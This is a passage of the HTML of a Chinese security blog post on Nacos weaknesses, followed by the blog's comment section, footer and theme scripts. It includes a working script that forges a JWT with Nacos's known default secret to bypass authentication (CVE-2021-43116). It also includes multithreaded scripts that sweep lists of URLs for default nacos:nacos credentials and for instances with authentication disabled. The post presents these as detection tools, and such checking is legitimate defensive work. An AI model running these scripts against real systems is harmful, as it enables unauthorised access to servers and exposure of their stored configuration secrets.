class="line">import base64</span><br><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import json</span><br><span class="line">from jwt.algorithms import has_crypto, requires_cryptography</span><br><span class="line">from jwt.utils import base64url_encode, force_bytes</span><br><span class="line">from jwt import PyJWS</span><br><span class="line"></span><br><span class="line">class MyPyJWS(PyJWS):</span><br><span class="line">    def encode(self,</span><br><span class="line">               payload,  # type: Union[Dict, bytes]</span><br><span class="line">               key,  # type: str</span><br><span class="line">               algorithm=&#x27;HS256&#x27;,  # type: str</span><br><span class="line">               headers=None,  # type: Optional[Dict]</span><br><span class="line">               json_encoder=None  # type: Optional[Callable]</span><br><span class="line">               ):</span><br><span class="line">        segments = []</span><br><span class="line"></span><br><span class="line">        if algorithm is None:</span><br><span class="line">            algorithm = &#x27;none&#x27;</span><br><span class="line"></span><br><span class="line">        if algorithm not in self._valid_algs:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">        # Header</span><br><span class="line">        header = &#123;&#x27;alg&#x27;: algorithm&#125;</span><br><span class="line"></span><br><span class="line">        if headers:</span><br><span class="line">            self._validate_headers(headers)</span><br><span class="line">            header.update(headers)</span><br><span class="line"></span><br><span class="line">        json_header = force_bytes(</span><br><span class="line">            json.dumps(</span><br><span class="line">                header,</span><br><span class="line">                separators=(&#x27;,&#x27;, &#x27;:&#x27;),</span><br><span class="line">                cls=json_encoder</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        segments.append(base64url_encode(json_header))</span><br><span class="line">        segments.append(base64url_encode(payload))</span><br><span class="line"></span><br><span class="line">        # Segments</span><br><span class="line">        signing_input = b&#x27;.&#x27;.join(segments)</span><br><span class="line">        try:</span><br><span class="line">            alg_obj = self._algorithms[algorithm]</span><br><span class="line">            key = alg_obj.prepare_key(key)</span><br><span class="line">            signature = alg_obj.sign(signing_input, key)</span><br><span class="line"></span><br><span class="line">        except KeyError:</span><br><span class="line">            if not has_crypto and algorithm in requires_cryptography:</span><br><span class="line">                raise NotImplementedError(</span><br><span class="line">                    &quot;Algorithm &#x27;%s&#x27; could not be found. Do you have cryptography &quot;</span><br><span class="line">                    &quot;installed?&quot; % algorithm</span><br><span class="line">                )</span><br><span class="line">            else:</span><br><span class="line">                raise NotImplementedError(&#x27;Algorithm not supported&#x27;)</span><br><span class="line"></span><br><span class="line">        segments.append(base64url_encode(signature))</span><br><span class="line"></span><br><span class="line">        return b&#x27;.&#x27;.join(segments)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def JwtGenerate():</span><br><span class="line">    Secret = &#x27;SecretKey01234567890123456789012345678901234567890123456789012345678&#x27;</span><br><span class="line">    payload = json.dumps(</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;sub&quot;: &quot;nacos&quot;,</span><br><span class="line">            &quot;exp&quot;: int(time.time()) + 3600</span><br><span class="line">        &#125;,</span><br><span class="line">        separators=(&#x27;,&#x27;, &#x27;:&#x27;)</span><br><span class="line">    ).encode(&#x27;utf-8&#x27;)</span><br><span class="line">    encoded_jwt = MyPyJWS().encode(payload, base64.urlsafe_b64decode(Secret), algorithm=&#x27;HS256&#x27;)</span><br><span class="line">    return encoded_jwt.decode()</span><br><span class="line"></span><br><span class="line">def check(url, https, token):</span><br><span class="line">    if https:</span><br><span class="line">        r = requests.get(</span><br><span class="line">            url=&#x27;https://&#x27; + url + &#x27;/nacos/v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=10&amp;tenant=&amp;search=accurate&amp;accessToken=&#x27; + token + &#x27;&amp;username=&#x27;,</span><br><span class="line">            verify=False)</span><br><span class="line">    else:</span><br><span class="line">        r = requests.get(</span><br><span class="line">            url=&#x27;http://&#x27; + url + &#x27;/nacos/v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=10&amp;tenant=&amp;search=accurate&amp;accessToken=&#x27; + token + &#x27;&amp;username=&#x27;)</span><br><span class="line">    if r.status_code == 403:</span><br><span class="line">        print(&quot;There is no CVE-2021-43116 problem with the url!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;There is CVE-2021-43116 problem with the url!&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, help=&quot;URL of the target. example: 192.168.1.1:8848&quot;)</span><br><span class="line">    parser.add_argument(&quot;-s&quot;, &quot;--https&quot;, help=&quot;Whether https is used. Default is false&quot;)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    url = args.target</span><br><span class="line">    https = False</span><br><span class="line">    if (args.https):</span><br><span class="line">        https = args.https</span><br><span class="line">    if url:</span><br><span class="line">        check(url, https, JwtGenerate())</span><br><span class="line">    else:</span><br><span class="line">        print(&#x27;Please enter URL!&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>比较粗糙的判别方式，可能存在漏洞的站点</p>
+<h1 id="4-Nacos默认口令"><a href="#4-Nacos默认口令" class="headerlink" title="4.Nacos默认口令"></a>4.Nacos默认口令</h1><ol>
+<li><p>使用下列脚本测试使用默认<code>nacos:nacos</code>口令的Nacos站点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import concurrent.futures</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Nacos-Server&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mydata = &#123;</span><br><span class="line">    &#x27;username&#x27;: &#x27;nacos&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;nacos&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_default(url):</span><br><span class="line">    endpoint = &quot;/v1/auth/login&quot;</span><br><span class="line">    r = requests.post(url + endpoint, verify=False, data=mydata, timeout=10)</span><br><span class="line">    try:</span><br><span class="line">        if r.status_code == 200 and &quot;data&quot; in r.text:</span><br><span class="line">            print(url + &quot; has default credentials&quot;)</span><br><span class="line">            return True</span><br><span class="line">        return False</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        check_default(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;请输入url.txt&quot;)</span><br><span class="line">    else:</span><br><span class="line">        file_path = sys.argv[1]</span><br><span class="line">        with open(file_path, &quot;r&quot;) as file:</span><br><span class="line">            # 读取文件的每一行</span><br><span class="line">            lines = file.readlines()</span><br><span class="line">            #for line in lines:</span><br><span class="line">            #    print(line.strip())  </span><br><span class="line">            with concurrent.futures.ThreadPoolExecutor() as executor:</span><br><span class="line">                # 提交任务给线程池</span><br><span class="line">                futures = [executor.submit(check_default,line.strip()) for line in lines]</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h1 id="5-没有开启鉴权"><a href="#5-没有开启鉴权" class="headerlink" title="5.没有开启鉴权"></a>5.没有开启鉴权</h1><p>检测脚本如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import concurrent.futures</span><br><span class="line">from urllib.parse import urlparse</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">requests.packages.urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line">mydata = &#123;</span><br><span class="line">    &#x27;username&#x27;: &#x27;nacos&#x27;,</span><br><span class="line">    &#x27;password&#x27;: &#x27;nacos&#x27;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check(url):</span><br><span class="line">    #endpoint = &quot;/v1/cs/configs?dataId=&amp;group=&amp;appName=&amp;config_tags=&amp;pageNo=1&amp;pageSize=10&amp;tenant=&amp;search=blur&quot;</span><br><span class="line">    endpoint = &quot;/v1/console/server/state?accessToken=&amp;username=&quot;</span><br><span class="line">    try:</span><br><span class="line">        r = requests.get(url+endpoint , verify=False, timeout=10)</span><br><span class="line">        response_json = r.json()</span><br><span class="line">            </span><br><span class="line">        if &quot;login_page_enabled&quot; in response_json and response_json[&quot;login_page_enabled&quot;] == &quot;false&quot;:</span><br><span class="line">            print(url + &quot; 未开启鉴权&quot;)</span><br><span class="line">            return True</span><br><span class="line">    except requests.exceptions.Timeout:</span><br><span class="line">        check(url)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">        return False</span><br><span class="line">    </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    if len(sys.argv) &lt; 2:</span><br><span class="line">        print(&quot;请输入url.txt&quot;)</span><br><span class="line">    else:</span><br><span class="line">        file_path = sys.argv[1]</span><br><span class="line">        with open(file_path, &quot;r&quot;) as file:</span><br><span class="line">            # 读取文件的每一行</span><br><span class="line">            lines = file.readlines()</span><br><span class="line">            #for line in lines:</span><br><span class="line">            #    print(line.strip())  </span><br><span class="line">            with concurrent.futures.ThreadPoolExecutor() as executor:</span><br><span class="line">                # 提交任务给线程池</span><br><span class="line">                futures = [executor.submit(check,line.strip()) for line in lines]</span><br></pre></td></tr></table></figure>
+
+
+
+</article>
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@Cber</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:axusun@qq.com">axusun@qq.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+</aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/cover/76b86c0226ffd.svg`,
+  };
+  const deps = {
+    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
+    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')){
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+    
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      let retryTimes = 3;
+      utils.onLoading(el);
+      function req() {
+        return new Promise((resolve, reject) => {
+          let status = 0; // 0 等待 1 完成 2 超时
+          let timer = setTimeout(() => {
+            if (status === 0) {
+              status = 2;
+              timer = null;
+              reject('请求超时');
+              if (retryTimes == 0) {
+                onFailure();
+              }
+            }
+          }, 5000);
+          fetch(url).then(function(response) {
+            if (status !== 2) {
+              clearTimeout(timer);
+              resolve(response);
+              timer = null;
+              status = 1;
+            }
+            if (response.ok) {
+              return response.json();
+            }
+            throw new Error('Network response was not ok.');
+          }).then(function(data) {
+            retryTimes = 0;
+            utils.onLoadSuccess(el);
+            callback(data);
+          }).catch(function(error) {
+            if (retryTimes > 0) {
+              retryTimes -= 1;
+              setTimeout(() => {
+                req();
+              }, 5000);
+            } else {
+              utils.onLoadFailure(el);
+              onFailure();
+            }
+          });
+        });
+      }
+      req();
+    },
+  };
+</script>
+
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.27.0" async></script>
+
+<!-- optional -->
+
+  <script type="module">
+  import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js'
+
+  function load_comment(){
+    if(!document.getElementById("waline_container"))return;
+
+    utils.css('https://unpkg.com/@waline/client@v3/dist/waline.css');
+    utils.css('https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css');
+
+    const el = document.getElementById("waline_container");
+    var path = el.getAttribute('comment_id');
+    if (!path) {
+      path = decodeURI(window.location.pathname);
+    }
+
+    const waline = init(Object.assign({"js":"https://unpkg.com/@waline/client@v3/dist/waline.js","css":"https://unpkg.com/@waline/client@v3/dist/waline.css","meta_css":"https://gcore.jsdelivr.net/npm/@waline/client@3.1.2/dist/waline-meta.css","serverURL":"https://www.regret.live","commentCount":true,"pageview":false,"locale":{"placeholder":"有什么想说的？大胆说出来吧(*^_^*)","reactionTitle":"请给这篇文章做个评价吧","reaction0":"感兴趣","reaction1":"给心心","reaction2":"什么？","reaction3":"心碎了","reaction4":"别过来","reaction5":"矮油~","reaction6":"不忍直视","reaction7":"我真生气辣！","reaction8":"摇晃","level0":"潜水","level1":"冒泡","level2":"吐槽","level3":"活跃","level4":"话痨","level5":"传说"},"reaction":["/emojis/ablobcatattentionreverse.png","/emojis/ablobcatheart.png","/emojis/ablobcatdoubt.png","/emojis/ablobcatheartbroken.png","/emojis/ablobcatterrified.png","/emojis/ablobcatshy.png","/emojis/ablobcatnoface.png","/emojis/ablobcatanger.gif","/emojis/ablobcatrainbow.png"],"emoji":["https://gcore.jsdelivr.net/gh/norevi/waline-blobcatemojis@1.0/blobs"]}, {
+      el: '#waline_container',
+      path: path,
+      
+    }));
+
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://cdn.bootcdn.net/ajax/libs/flying-pages/2.1.2/flying-pages.min.js"></script><script defer src="https://cdn.bootcdn.net/ajax/libs/vanilla-lazyload/17.8.4/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+</script><script>
+  ctx.fancybox = {
+    selector: `.swiper-slide img, .gallery img ,#waline_container .vcontent img`,
+    css: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.min.css`,
+    js: `https://cdn.bootcdn.net/ajax/libs/fancyapps-ui/5.0.22/fancybox/fancybox.umd.min.js`
+  };
+  var selector = '[data-fancybox]:not(.error)';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const els = document.getElementsByClassName('ds-memos');
+    if (els != undefined && els.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || null
+        }
+      });
+    })
+  }
+</script><script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
+      utils.css(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.css`);
+      utils.js(`https://unpkg.com/swiper@10.3.1/swiper-bundle.min.js`, { defer: true }).then(function () {
+        const effect = swiper_api.getAttribute('effect') || '';
+        var swiper = new Swiper('.swiper#swiper-api', {
+          slidesPerView: 'auto',
+          spaceBetween: 8,
+          centeredSlides: true,
+          effect: effect,
+          loop: true,
+          pagination: {
+            el: '.swiper-pagination',
+            clickable: true,
+          },
+          navigation: {
+            nextEl: '.swiper-button-next',
+            prevEl: '.swiper-button-prev',
+          },
+        });
+      })
+    }
+  });
+</script><script>
+  document.addEventListener('DOMContentLoaded', function () {
+    window.codeElements = document.querySelectorAll('.code');
+    if (window.codeElements.length > 0) {
+      ctx.copycode = {
+        default_text: `Copy`,
+        success_text: `Copied`,
+        toast: `复制成功`,
+      };
+      utils.js('/js/plugins/copycode.js');
+    }
+  });
+</script>
+
+
+<!-- inject -->
+<script type="text/javascript" src="/js/darkmode.js"></script>
+</div></body></html>
